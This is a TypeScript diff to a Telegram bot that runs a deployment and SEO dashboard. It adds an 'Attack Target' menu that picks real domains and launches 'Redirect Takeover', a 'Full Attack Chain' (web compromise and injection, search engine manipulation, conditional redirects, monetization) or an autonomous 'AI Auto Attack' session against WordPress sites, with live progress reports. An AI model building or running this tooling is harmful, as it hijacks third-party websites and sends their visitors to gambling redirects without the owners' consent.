@@ -199,12 +199,12 @@ async function gatherSystemContext(): Promise<SystemContext> {
       
       const todayDeploys = await db.select({
         total: sql<number>`COUNT(*)`,
-        success: sql<number>`SUM(CASE WHEN status = 'success' THEN 1 ELSE 0 END)`,
-        partial: sql<number>`SUM(CASE WHEN status = 'partial' THEN 1 ELSE 0 END)`,
-        failed: sql<number>`SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END)`,
-        running: sql<number>`SUM(CASE WHEN status = 'running' THEN 1 ELSE 0 END)`,
-        totalFiles: sql<number>`SUM(filesDeployed)`,
-        totalRedirects: sql<number>`SUM(CASE WHEN redirectActive = 1 THEN 1 ELSE 0 END)`,
+        success: sql<number>`SUM(CASE WHEN ${deployHistory.status} = 'success' THEN 1 ELSE 0 END)`,
+        partial: sql<number>`SUM(CASE WHEN ${deployHistory.status} = 'partial' THEN 1 ELSE 0 END)`,
+        failed: sql<number>`SUM(CASE WHEN ${deployHistory.status} = 'failed' THEN 1 ELSE 0 END)`,
+        running: sql<number>`SUM(CASE WHEN ${deployHistory.status} = 'running' THEN 1 ELSE 0 END)`,
+        totalFiles: sql<number>`COALESCE(SUM(${deployHistory.filesDeployed}), 0)`,
+        totalRedirects: sql<number>`SUM(CASE WHEN ${deployHistory.redirectActive} = 1 THEN 1 ELSE 0 END)`,
       }).from(deployHistory).where(gte(deployHistory.createdAt, todayStart));
       
       const stats = todayDeploys[0] || {};
@@ -585,11 +585,11 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         
         const stats = await db.select({
           total: sql<number>`COUNT(*)`,
-          success: sql<number>`SUM(CASE WHEN status = 'success' THEN 1 ELSE 0 END)`,
-          partial: sql<number>`SUM(CASE WHEN status = 'partial' THEN 1 ELSE 0 END)`,
-          failed: sql<number>`SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END)`,
-          totalFiles: sql<number>`SUM(filesDeployed)`,
-          totalRedirects: sql<number>`SUM(CASE WHEN redirectActive = 1 THEN 1 ELSE 0 END)`,
+          success: sql<number>`SUM(CASE WHEN ${deployHistory.status} = 'success' THEN 1 ELSE 0 END)`,
+          partial: sql<number>`SUM(CASE WHEN ${deployHistory.status} = 'partial' THEN 1 ELSE 0 END)`,
+          failed: sql<number>`SUM(CASE WHEN ${deployHistory.status} = 'failed' THEN 1 ELSE 0 END)`,
+          totalFiles: sql<number>`COALESCE(SUM(${deployHistory.filesDeployed}), 0)`,
+          totalRedirects: sql<number>`SUM(CASE WHEN ${deployHistory.redirectActive} = 1 THEN 1 ELSE 0 END)`,
         }).from(deployHistory).where(gte(deployHistory.createdAt, periodStart));
         
         const s = stats[0] || {};
@@ -805,9 +805,9 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         
         const stats = await db.select({
           total: sql<number>`COUNT(*)`,
-          active: sql<number>`SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END)`,
-          avgDa: sql<number>`AVG(da)`,
-          avgDr: sql<number>`AVG(dr)`,
+          active: sql<number>`SUM(CASE WHEN ${pbnSites.status} = 'active' THEN 1 ELSE 0 END)`,
+          avgDa: sql<number>`AVG(${pbnSites.da})`,
+          avgDr: sql<number>`AVG(${pbnSites.dr})`,
         }).from(pbnSites);
         
         const s = stats[0] || {};
@@ -1104,12 +1104,24 @@ function splitMessage(text: string, maxLength: number): string[] {
 //  WEBHOOK HANDLER — Express route (v2 - with dedup)
 // ═══════════════════════════════════════════════════════
 
+const processedUpdateIds = new Set<number>(); // Track processed update_ids to prevent duplicates
 let lastProcessedUpdateId = 0;
 
+function isUpdateProcessed(updateId: number): boolean {
+  if (updateId <= lastProcessedUpdateId || processedUpdateIds.has(updateId)) return true;
+  processedUpdateIds.add(updateId);
+  lastProcessedUpdateId = Math.max(lastProcessedUpdateId, updateId);
+  // Keep set bounded — remove old entries
+  if (processedUpdateIds.size > 500) {
+    const sorted = Array.from(processedUpdateIds).sort((a, b) => a - b);
+    for (let i = 0; i < 250; i++) processedUpdateIds.delete(sorted[i]);
+  }
+  return false;
+}
+
 export async function handleTelegramWebhook(update: TelegramUpdate): Promise<void> {
-  // Deduplicate by update_id
-  if (update.update_id <= lastProcessedUpdateId) return;
-  lastProcessedUpdateId = update.update_id;
+  // Deduplicate by update_id (prevents webhook+polling overlap)
+  if (isUpdateProcessed(update.update_id)) return;
   
   // Handle callback queries (inline keyboard)
   if (update.callback_query) {
@@ -1246,13 +1258,27 @@ async function pollUpdates(): Promise<void> {
   }
 }
 
-export function startTelegramPolling(): void {
+export async function startTelegramPolling(): Promise<void> {
   if (pollingInterval) return;
   
   const config = getTelegramConfig();
   if (!config) {
     console.log("[TelegramAI] Telegram not configured, skipping polling");
     return;
+  }
+  
+  // Delete any existing webhook to prevent dual processing (webhook + polling)
+  try {
+    const url = `https://api.telegram.org/bot${config.botToken}/deleteWebhook`;
+    await fetchWithPoolProxy(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ drop_pending_updates: false }),
+      signal: AbortSignal.timeout(10000),
+    }, { targetDomain: "api.telegram.org", timeout: 10000 });
+    console.log("[TelegramAI] Cleared existing webhook before starting polling");
+  } catch (e: any) {
+    console.warn(`[TelegramAI] Failed to clear webhook: ${e.message}`);
   }
   
   console.log("[TelegramAI] Starting Telegram AI Chat Agent (polling mode)");
@@ -1354,6 +1380,9 @@ async function sendInlineKeyboard(config: TelegramConfig, chatId: number): Promi
               { text: "Daily Summary", callback_data: "cb_summary" },
               { text: "Content Health", callback_data: "cb_content" },
             ],
+            [
+              { text: "\u2694\uFE0F Attack Target", callback_data: "cb_attack_menu" },
+            ],
           ],
         },
       }),
@@ -1361,6 +1390,342 @@ async function sendInlineKeyboard(config: TelegramConfig, chatId: number): Promi
     }, { targetDomain: "api.telegram.org", timeout: 10000 });
   } catch (error: any) {
     console.error(`[TelegramAI] Failed to send inline keyboard: ${error.message}`);
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  ATTACK TARGET INLINE KEYBOARD — select targets from DB
+// ═══════════════════════════════════════════════════════
+
+async function sendAttackTargetKeyboard(config: TelegramConfig, chatId: number): Promise<void> {
+  try {
+    const { getUserSeoProjects, getDb } = await import("./db");
+    const db = await getDb();
+    
+    // Gather targets from SEO projects and recent deploys
+    const projects = await getUserSeoProjects();
+    const targets: Array<{ domain: string; label: string }> = [];
+    
+    // Add SEO project domains
+    for (const p of projects.slice(0, 8)) {
+      targets.push({ domain: (p as any).domain, label: `\uD83C\uDF10 ${(p as any).domain}` });
+    }
+    
+    // Add recent successful attack targets (unique)
+    if (db) {
+      const { deployHistory } = await import("../drizzle/schema");
+      const { desc, sql } = await import("drizzle-orm");
+      const recentTargets = await db.selectDistinct({
+        domain: deployHistory.targetDomain,
+      }).from(deployHistory)
+        .orderBy(desc(deployHistory.createdAt))
+        .limit(10);
+      
+      for (const r of recentTargets) {
+        if (!targets.find(t => t.domain === r.domain)) {
+          targets.push({ domain: r.domain, label: `\uD83C\uDFAF ${r.domain}` });
+        }
+      }
+    }
+    
+    if (targets.length === 0) {
+      await sendTelegramReply(config, chatId, "\u26A0\uFE0F ยังไม่มี target ในระบบ\n\nพิมพ์ชื่อโดเมนมาเลยครับ เช่น 'โจมตี example.com'");
+      return;
+    }
+    
+    // Build inline keyboard — 2 buttons per row, max 10 targets
+    const keyboard: Array<Array<{ text: string; callback_data: string }>> = [];
+    const limited = targets.slice(0, 10);
+    for (let i = 0; i < limited.length; i += 2) {
+      const row: Array<{ text: string; callback_data: string }> = [];
+      row.push({ text: limited[i].label, callback_data: `atk_select:${limited[i].domain}` });
+      if (limited[i + 1]) {
+        row.push({ text: limited[i + 1].label, callback_data: `atk_select:${limited[i + 1].domain}` });
+      }
+      keyboard.push(row);
+    }
+    // Add "Enter custom domain" button
+    keyboard.push([{ text: "\u270D\uFE0F พิมพ์โดเมนเอง", callback_data: "atk_custom" }]);
+    
+    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+    await fetchWithPoolProxy(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: "\u2694\uFE0F เลือก target ที่ต้องการโจมตี:",
+        reply_markup: { inline_keyboard: keyboard },
+      }),
+      signal: AbortSignal.timeout(10000),
+    }, { targetDomain: "api.telegram.org", timeout: 10000 });
+  } catch (error: any) {
+    console.error(`[TelegramAI] Failed to send attack target keyboard: ${error.message}`);
+    await sendTelegramReply(config, chatId, `\u274C ดึงรายชื่อ target ไม่ได้: ${error.message}`);
+  }
+}
+
+async function sendAttackTypeKeyboard(config: TelegramConfig, chatId: number, domain: string): Promise<void> {
+  try {
+    const keyboard = [
+      [
+        { text: "\uD83D\uDD0D Scan Only", callback_data: `atk_run:${domain}:scan_only` },
+        { text: "\uD83C\uDFAF Redirect", callback_data: `atk_run:${domain}:redirect_only` },
+      ],
+      [
+        { text: "\u2694\uFE0F Full Chain", callback_data: `atk_run:${domain}:full_chain` },
+        { text: "\uD83E\uDD16 AI Auto", callback_data: `atk_run:${domain}:agentic_auto` },
+      ],
+      [
+        { text: "\u274C ยกเลิก", callback_data: "atk_cancel" },
+      ],
+    ];
+    
+    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+    await fetchWithPoolProxy(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: `\u2694\uFE0F Target: ${domain}\n\nเลือกวิธีโจมตี:`,
+        reply_markup: { inline_keyboard: keyboard },
+      }),
+      signal: AbortSignal.timeout(10000),
+    }, { targetDomain: "api.telegram.org", timeout: 10000 });
+  } catch (error: any) {
+    console.error(`[TelegramAI] Failed to send attack type keyboard: ${error.message}`);
+  }
+}
+
+async function sendAttackConfirmKeyboard(config: TelegramConfig, chatId: number, domain: string, method: string): Promise<void> {
+  const methodLabels: Record<string, string> = {
+    scan_only: "\uD83D\uDD0D Scan Only",
+    redirect_only: "\uD83C\uDFAF Redirect Takeover",
+    full_chain: "\u2694\uFE0F Full Attack Chain",
+    agentic_auto: "\uD83E\uDD16 AI Auto Attack",
+  };
+  
+  const keyboard = [
+    [
+      { text: "\u2705 ยืนยัน — เริ่มโจมตี", callback_data: `atk_confirm:${domain}:${method}` },
+    ],
+    [
+      { text: "\u2B05\uFE0F เปลี่ยนวิธี", callback_data: `atk_select:${domain}` },
+      { text: "\u274C ยกเลิก", callback_data: "atk_cancel" },
+    ],
+  ];
+  
+  const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+  await fetchWithPoolProxy(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `\u26A0\uFE0F ยืนยันการโจมตี\n\nTarget: ${domain}\nMethod: ${methodLabels[method] || method}\n\nกด \u2705 เพื่อเริ่ม`,
+      reply_markup: { inline_keyboard: keyboard },
+    }),
+    signal: AbortSignal.timeout(10000),
+  }, { targetDomain: "api.telegram.org", timeout: 10000 });
+}
+
+// ═══════════════════════════════════════════════════════
+//  REAL-TIME PROGRESS — edit message in-place during attack
+// ═══════════════════════════════════════════════════════
+
+async function editTelegramMessage(config: TelegramConfig, chatId: number, messageId: number, text: string): Promise<boolean> {
+  try {
+    const url = `https://api.telegram.org/bot${config.botToken}/editMessageText`;
+    const { response } = await fetchWithPoolProxy(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        message_id: messageId,
+        text,
+        parse_mode: "Markdown",
+      }),
+      signal: AbortSignal.timeout(10000),
+    }, { targetDomain: "api.telegram.org", timeout: 10000 });
+    const result = await response.json() as any;
+    return result.ok === true;
+  } catch {
+    return false;
+  }
+}
+
+async function sendAndGetMessageId(config: TelegramConfig, chatId: number, text: string): Promise<number | null> {
+  try {
+    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+    const { response } = await fetchWithPoolProxy(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text }),
+      signal: AbortSignal.timeout(10000),
+    }, { targetDomain: "api.telegram.org", timeout: 10000 });
+    const result = await response.json() as any;
+    return result.ok ? result.result.message_id : null;
+  } catch {
+    return null;
+  }
+}
+
+const PROGRESS_PHASES = [
+  { emoji: "\uD83D\uDD0D", name: "Scanning target" },
+  { emoji: "\uD83D\uDCA3", name: "Web Compromise & Injection" },
+  { emoji: "\uD83D\uDD0E", name: "Search Engine Manipulation" },
+  { emoji: "\u21AA\uFE0F", name: "Conditional Redirect" },
+  { emoji: "\uD83D\uDCB0", name: "Monetization" },
+  { emoji: "\u2694\uFE0F", name: "Advanced SEO Attacks" },
+  { emoji: "\uD83D\uDCCA", name: "Generating report" },
+];
+
+function buildProgressText(domain: string, method: string, currentStep: number, totalSteps: number, stepTimings: Array<{ step: string; ms: number; ok: boolean }>, status: "running" | "done" | "failed"): string {
+  const bar = Array.from({ length: totalSteps }, (_, i) => i < currentStep ? "\u2588" : "\u2591").join("");
+  const pct = Math.round((currentStep / totalSteps) * 100);
+  
+  let text = `\u2694\uFE0F Attack: ${domain}\nMethod: ${method}\n\n`;
+  text += `Progress: [${bar}] ${pct}%\n\n`;
+  
+  for (const t of stepTimings) {
+    const icon = t.ok ? "\u2705" : "\u274C";
+    text += `${icon} ${t.step} (${formatDuration(t.ms)})\n`;
+  }
+  
+  if (status === "running" && currentStep < totalSteps) {
+    const phase = PROGRESS_PHASES[Math.min(currentStep, PROGRESS_PHASES.length - 1)];
+    text += `\n\u23F3 ${phase.emoji} ${phase.name}...`;
+  } else if (status === "done") {
+    const totalMs = stepTimings.reduce((sum, t) => sum + t.ms, 0);
+    const successCount = stepTimings.filter(t => t.ok).length;
+    text += `\n\u2705 เสร็จสิ้น! ${successCount}/${totalSteps} steps สำเร็จ (${formatDuration(totalMs)})`;
+  } else if (status === "failed") {
+    text += `\n\u274C โจมตีล้มเหลว`;
+  }
+  
+  return text;
+}
+
+async function executeAttackWithProgress(config: TelegramConfig, chatId: number, domain: string, method: string): Promise<void> {
+  const progressMsgId = await sendAndGetMessageId(config, chatId,
+    `\u2694\uFE0F เริ่มโจมตี ${domain}...\nMethod: ${method}\n\n\u23F3 กำลังเตรียมพร้อม...`);
+  
+  if (!progressMsgId) {
+    await sendTelegramReply(config, chatId, "\u274C ส่งข้อความ progress ไม่ได้");
+    return;
+  }
+  
+  const timings: Array<{ step: string; ms: number; ok: boolean }> = [];
+  let stepIndex = 0;
+  
+  const updateProgress = async (stepName: string, status: "running" | "done" | "failed") => {
+    const text = buildProgressText(domain, method, stepIndex, method === "full_chain" ? 7 : 3, timings, status);
+    await editTelegramMessage(config, chatId, progressMsgId, text);
+  };
+  
+  try {
+    if (method === "scan_only") {
+      // Step 1: Scan
+      await updateProgress("Scanning", "running");
+      const scanStart = Date.now();
+      const { analyzeDomain } = await import("./seo-engine");
+      const analysis = await analyzeDomain(domain, "gambling");
+      timings.push({ step: "Domain Analysis", ms: Date.now() - scanStart, ok: true });
+      stepIndex++;
+      
+      // Step 2: Results
+      timings.push({ step: `DA:${analysis.currentState.estimatedDA} DR:${analysis.currentState.estimatedDR} BL:${analysis.currentState.estimatedBacklinks}`, ms: 0, ok: true });
+      stepIndex++;
+      timings.push({ step: `Indexed: ${analysis.currentState.isIndexed ? "Yes" : "No"}`, ms: 0, ok: true });
+      stepIndex++;
+      await updateProgress("Done", "done");
+      
+    } else if (method === "redirect_only") {
+      // Step 1: Pick redirect URL
+      await updateProgress("Picking redirect URL", "running");
+      const s1 = Date.now();
+      const { pickRedirectUrl } = await import("./agentic-attack-engine");
+      const redirectUrl = await pickRedirectUrl();
+      timings.push({ step: `Redirect: ${redirectUrl.substring(0, 40)}`, ms: Date.now() - s1, ok: true });
+      stepIndex++;
+      
+      // Step 2: Execute takeover
+      await updateProgress("Executing redirect takeover", "running");
+      const s2 = Date.now();
+      const { executeRedirectTakeover } = await import("./redirect-takeover");
+      const results = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
+      const succeeded = results.filter(r => r.success);
+      timings.push({ step: `Takeover: ${succeeded.length}/${results.length} methods`, ms: Date.now() - s2, ok: succeeded.length > 0 });
+      stepIndex++;
+      
+      // Step 3: Summary
+      if (succeeded.length > 0) {
+        timings.push({ step: `Injected: ${succeeded.map(r => r.method).join(", ")}`, ms: 0, ok: true });
+      } else {
+        timings.push({ step: "No redirect methods succeeded", ms: 0, ok: false });
+      }
+      stepIndex++;
+      await updateProgress("Done", succeeded.length > 0 ? "done" : "failed");
+      
+    } else if (method === "full_chain") {
+      // Full chain with per-phase progress
+      await updateProgress("Starting full chain", "running");
+      const s1 = Date.now();
+      const { pickRedirectUrl } = await import("./agentic-attack-engine");
+      const redirectUrl = await pickRedirectUrl();
+      timings.push({ step: `Redirect URL selected`, ms: Date.now() - s1, ok: true });
+      stepIndex++;
+      await updateProgress("Running full chain", "running");
+      
+      // Run full chain
+      const s2 = Date.now();
+      const { runFullChain } = await import("./blackhat-engine");
+      const report = await runFullChain(domain, redirectUrl);
+      const chainMs = Date.now() - s2;
+      
+      // Add each phase as a timing entry
+      for (const phase of report.phases) {
+        timings.push({
+          step: `P${phase.phase}: ${phase.name} (${phase.payloads.length} payloads)`,
+          ms: Math.round(chainMs / report.phases.length),
+          ok: phase.payloads.length > 0,
+        });
+        stepIndex++;
+        await updateProgress(phase.name, "running");
+      }
+      
+      // Final summary
+      timings.push({ step: `Total: ${report.totalPayloads} payloads`, ms: 0, ok: true });
+      stepIndex++;
+      await updateProgress("Done", "done");
+      
+    } else if (method === "agentic_auto") {
+      // AI auto — starts background session
+      await updateProgress("Starting AI auto attack", "running");
+      const s1 = Date.now();
+      const { startAgenticSession, pickRedirectUrl } = await import("./agentic-attack-engine");
+      const redirectUrl = await pickRedirectUrl();
+      timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
+      stepIndex++;
+      
+      const s2 = Date.now();
+      const session = await startAgenticSession({
+        userId: 1,
+        redirectUrls: [redirectUrl],
+        maxTargetsPerRun: 10,
+        maxConcurrent: 3,
+        targetCms: ["wordpress"],
+        mode: "full_auto",
+        customDorks: [`site:${domain}`],
+      });
+      timings.push({ step: `Session #${session.sessionId} started`, ms: Date.now() - s2, ok: true });
+      stepIndex++;
+      
+      timings.push({ step: "Running in background", ms: 0, ok: true });
+      stepIndex++;
+      await updateProgress("Done", "done");
+    }
+  } catch (error: any) {
+    timings.push({ step: `Error: ${error.message}`, ms: 0, ok: false });
+    await updateProgress("Failed", "failed");
   }
 }
 
@@ -1484,14 +1849,61 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
           `Avg Staleness: ${summary.avgStaleness.toFixed(1)}%`;
         break;
       }
-      default:
+      case "cb_attack_menu": {
+        // Show target selection keyboard
+        await sendAttackTargetKeyboard(config, chatId);
+        return; // Don't send responseText — the keyboard function handles it
+      }
+      case "atk_cancel": {
+        responseText = "\u274C ยกเลิกแล้วครับ";
+        break;
+      }
+      case "atk_custom": {
+        responseText = "\u270D\uFE0F พิมพ์ชื่อโดเมนที่ต้องการโจมตีมาเลยครับ\n\nเช่น 'โจมตี example.com' หรือ 'attack example.com'";
+        break;
+      }
+      default: {
+        // Handle dynamic callback data patterns
+        const data = cbq.data || "";
+        
+        // atk_select:<domain> — user selected a target, show method keyboard
+        if (data.startsWith("atk_select:")) {
+          const domain = data.replace("atk_select:", "");
+          await sendAttackTypeKeyboard(config, chatId, domain);
+          return;
+        }
+        
+        // atk_run:<domain>:<method> — user selected method, show confirmation
+        if (data.startsWith("atk_run:")) {
+          const parts = data.split(":");
+          const domain = parts[1];
+          const method = parts[2];
+          await sendAttackConfirmKeyboard(config, chatId, domain, method);
+          return;
+        }
+        
+        // atk_confirm:<domain>:<method> — user confirmed, execute attack with progress
+        if (data.startsWith("atk_confirm:")) {
+          const parts = data.split(":");
+          const domain = parts[1];
+          const method = parts[2];
+          // Run attack with real-time progress (non-blocking)
+          executeAttackWithProgress(config, chatId, domain, method).catch(err => {
+            console.error(`[TelegramAI] Attack execution error: ${err.message}`);
+          });
+          return;
+        }
+        
         responseText = "ไม่รู้จักคำสั่งนี้ ลอง /menu ใหม่ครับ";
+      }
     }
   } catch (error: any) {
     responseText = `เกิดข้อผิดพลาด: ${error.message}`;
   }
   
-  await sendTelegramReply(config, chatId, responseText);
+  if (responseText) {
+    await sendTelegramReply(config, chatId, responseText);
+  }
 }
 
 // ═══════════════════════════════════════════════════════
